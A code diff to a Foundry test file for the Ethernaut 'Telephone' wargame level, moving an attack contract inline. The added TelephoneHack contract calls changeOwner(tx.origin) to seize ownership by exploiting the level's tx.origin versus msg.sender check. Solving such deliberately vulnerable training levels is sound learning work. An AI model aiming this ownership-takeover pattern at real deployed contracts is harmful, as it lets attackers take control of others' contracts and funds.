@@ -3,7 +3,6 @@ pragma solidity ^0.8.14;
 
 import "forge-std/Test.sol";
 import "../src/Telephone/TelephoneFactory.sol";
-import "../src/Telephone/TelephoneHack.sol";
 import "../src/Ethernaut.sol";
 import "forge-std/console.sol";
 
@@ -44,4 +43,20 @@ contract TelephoneTest is Test {
         vm.stopPrank();
         assert(levelSuccessfullyPassed);
     }
+}
+
+contract TelephoneHack {
+    Telephone public challenge;
+
+    constructor(address challengeAddress) {
+        challenge = Telephone(payable(challengeAddress));
+    }
+
+    function attack() external payable {
+        // the condition to change the owner is that
+        //msg.sender != tx.origin
+        challenge.changeOwner(tx.origin);
+    }
+
+    fallback() external payable {}
 }
